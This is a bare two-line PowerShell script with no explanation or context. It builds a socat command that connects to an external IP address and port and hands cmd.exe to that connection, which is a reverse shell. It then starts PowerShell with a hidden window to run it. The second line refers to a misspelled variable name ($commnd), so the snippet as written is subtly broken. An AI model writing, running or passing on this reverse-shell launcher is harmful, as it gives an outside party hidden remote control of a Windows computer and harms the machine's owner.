$command = ".\socat.exe tcp-connect:52.28.112.211:17541 exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $commnd }`"" -WindowStyle Hidden